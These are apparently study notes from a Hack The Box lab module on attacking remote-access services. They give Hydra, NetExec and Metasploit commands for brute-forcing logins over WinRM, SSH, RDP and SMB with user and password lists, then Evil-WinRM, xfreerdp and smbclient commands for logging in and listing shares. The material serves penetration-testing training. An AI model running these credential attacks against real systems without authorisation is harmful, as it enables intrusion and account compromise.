## WinRM
### NetExec
#### Installing NetExec

```shell
3kjS@htb[/htb]$ sudo apt-get -y install netexec
```
#### NetExec Menu Options

```shell
3kjS@htb[/htb]$ netexec -h
```
#### NetExec Protocol-Specific Help

```shell
3kjS@htb[/htb]$ netexec smb -h
```
#### NetExec Usage

```shell
3kjS@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

As an example, this is what attacking a WinRM endpoint might look like:

```shell
3kjS@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
```
### Evil-WinRM
#### Installing Evil-WinRM

```shell
3kjS@htb[/htb]$ sudo gem install evil-winrm
```
#### Evil-WinRM Usage

```shell
3kjS@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell
3kjS@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password 

Evil-WinRM shell v3.3 

Info: Establishing connection to remote endpoint 

*Evil-WinRM* PS C:\Users\user\Documents>
```

## SSH
#### Hydra - SSH

```shell
3kjS@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
```

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

```shell
3kjS@htb[/htb]$ ssh user@10.129.42.197
```
## Remote Desktop Protocol (RDP)
#### Hydra - RDP

```shell
3kjS@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```
#### xFreeRDP

```shell
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```shell
3kjS@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password 

<SNIP> 

New Certificate details: 
		Common Name: WINSRV 
		Subject: CN = WINSRV 
		Issuer: CN = WINSRV 
		Thumbprint: cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb 

Do you trust the above certificate? (Y/T/N) Y
```
![[Pasted image 20260507113058.png]]
## SMB
#### Hydra - SMB

```shell
3kjS@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```
#### Hydra - Error

```shell
3kjS@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13 [INFO] Reduced number of tasks to 1 (smb does not like parallel connections) [DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task 
[DATA] attacking smb://10.129.42.197:445/ 
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
#### Metasploit Framework

```shell
3kjS@htb[/htb]$ msfconsole -q msf6 > use auxiliary/scanner/smb/smb_login 

msf6 auxiliary(scanner/smb/smb_login) > options
```
#### NetExec

```shell
3kjS@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
#### Smbclient

```shell
3kjS@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```

